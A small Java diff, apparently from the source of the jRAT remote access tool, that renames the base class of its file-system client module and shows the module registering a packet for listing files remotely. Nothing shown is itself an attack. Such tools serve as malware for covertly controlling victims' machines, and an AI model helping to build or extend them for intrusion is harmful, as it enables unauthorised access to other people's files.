@@ -1,10 +1,10 @@
 package jrat.module.fs;
 
-import jrat.api.Module;
+import jrat.api.ClientModule;
 import jrat.client.packets.incoming.IncomingPackets;
 import jrat.module.fs.packets.*;
 
-public class FileSystemClientModule extends Module {
+public class FileSystemClientModule extends ClientModule {
 
     public void init() throws Exception {
         IncomingPackets.register((short) 15, Packet15ListFiles.class);
